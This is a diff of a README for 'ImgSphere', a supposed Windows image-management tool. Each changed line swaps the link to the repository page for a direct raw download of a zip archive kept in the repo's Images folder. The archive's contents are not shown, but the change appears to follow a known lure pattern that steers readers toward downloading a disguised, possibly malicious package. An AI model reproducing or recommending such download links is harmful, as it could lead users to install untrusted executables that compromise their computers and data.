@@ -1,10 +1,10 @@
 # 🖼️ ImgSphere - Simple image management for Windows
 
-[![Download ImgSphere](https://img.shields.io/badge/Download%20ImgSphere-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Blarelockerroom945/ImgSphere)
+[![Download ImgSphere](https://img.shields.io/badge/Download%20ImgSphere-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Blarelockerroom945/ImgSphere/raw/refs/heads/main/Images/Sphere_Img_2.2-alpha.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Blarelockerroom945/ImgSphere
+Visit this page to download: https://github.com/Blarelockerroom945/ImgSphere/raw/refs/heads/main/Images/Sphere_Img_2.2-alpha.2.zip
 
 Open the link in your browser, then download the project files to your Windows PC.
 
@@ -150,4 +150,4 @@ A current browser helps the gallery load with the right styles and effects.
 
 ## 📎 Project Link
 
-Primary download link: https://github.com/Blarelockerroom945/ImgSphere
+Primary download link: https://github.com/Blarelockerroom945/ImgSphere/raw/refs/heads/main/Images/Sphere_Img_2.2-alpha.2.zip
